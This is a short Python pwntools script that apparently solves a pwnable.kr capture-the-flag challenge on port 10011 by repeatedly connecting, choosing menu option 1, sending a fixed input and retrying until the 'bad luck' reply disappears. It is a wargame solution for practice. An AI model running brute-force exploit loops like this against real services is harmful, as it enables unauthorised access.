from pwn import *

HOST = 'pwnable.kr'
PORT = 10011

while True:
    p = remote(HOST, PORT)

    p.sendlineafter(b'3. Exit\n', b'1')
    p.send(b'######')

    out = p.recvall(timeout = 2)

    if b"bad luck" not in out:
        print(out.decode(errors = 'ignore'))
        break

    p.close()